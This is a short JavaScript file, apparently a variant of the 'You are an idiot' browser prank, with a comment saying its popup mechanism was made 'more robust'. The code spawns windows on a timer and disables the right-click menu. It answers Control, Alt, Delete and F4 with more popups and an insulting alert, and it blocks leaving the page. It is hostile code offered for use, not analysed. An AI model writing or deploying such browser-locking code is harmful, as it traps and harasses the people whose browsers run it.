/*
 * [Aug 2023] Fixed the popup mechanism, made it more robust.
 *
 * Requires safe.js & math.js preload.
 */

window.onload = playBall;
setInterval(() => {
    proCreate(6);
}, 5000);
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(3);

		alert("You are an idiot!");
		proCreate(6);
	}

	return null;
}
window.onbeforeunload = () => "Are you an idiot?";
/* [Aug 2023] End of amendments. */